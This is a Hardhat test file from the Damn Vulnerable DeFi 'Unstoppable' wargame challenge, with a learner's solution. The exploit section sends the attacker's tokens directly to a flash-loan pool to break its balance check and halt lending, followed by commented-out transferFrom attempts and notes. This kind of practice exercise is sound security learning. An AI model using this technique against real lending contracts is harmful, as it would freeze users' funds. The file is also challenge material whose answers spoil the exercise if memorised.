const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Unstoppable', function () {
    let deployer, attacker, someUser;

    // Pool has 1M * 10**18 tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
    const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, attacker, someUser] = await ethers.getSigners();

        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);

        this.token = await DamnValuableTokenFactory.deploy();
        this.pool = await UnstoppableLenderFactory.deploy(this.token.address);

        await this.token.approve(this.pool.address, TOKENS_IN_POOL);
        await this.pool.depositTokens(TOKENS_IN_POOL);

        await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);

         // Show it's possible for someUser to take out a flash loan
         const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
         this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
         await this.receiverContract.executeFlashLoan(10);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        // The goal is to stop the Unstoppable lender from being able execute the flashloan function
        // You would have to update the poolbalance in such a way that it is not that same as the balance before


        // transfer vs transferFrom
        //If you want to transfer the token by yourself, you call transfer

        //Solution one using transfer
        const attackerConnectedToken = await this.token.connect(attacker)
        await attackerConnectedToken.transfer(this.pool.address,INITIAL_ATTACKER_TOKEN_BALANCE);


        //Solution 2 using transfrom
        //With transfrerFrom you would have to approve the spender contract to allow it to spend your token up to the token limit

        // Idk why this doesnt wait but the concept is the saame but using transfrom instead
        /*
        const attackerConnectedToken = await this.token.connect(attacker)
        await attackerConnectedToken.approve(this.token.address,INITIAL_ATTACKER_TOKEN_BALANCE);
        await this.token.transferFrom(attacker.address,this.pool.address);
        */

        // This follwing below answer my question
        // Yes, a smart contract can approve so another smart contract to spend its tokens. Your contract cannot execute by itself,
        // hence, you will need to write a function in the contract that is able to send the approval request to the ERC20 token so another contract or EOA can spend it

        //So the key idea is that the token can't execute the transferFrom itself, whic means me trying to approve the token to spend my erc20 token is redundant

        // const attackerConnectedToken = await this.token.connect(attacker)
        // await attackerConnectedToken.approve(someUser.address,INITIAL_ATTACKER_TOKEN_BALANCE);
        // const someUserConnectedToken = await this.token.connect(someUser)
        // await someUserConnectedToken.transferFrom(attacker.address,this.pool.address,ethers.utils.parseEther('10'));
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // It is no longer possible to execute flash loans
        await expect(
            this.receiverContract.executeFlashLoan(10)
        ).to.be.reverted;
    });
});
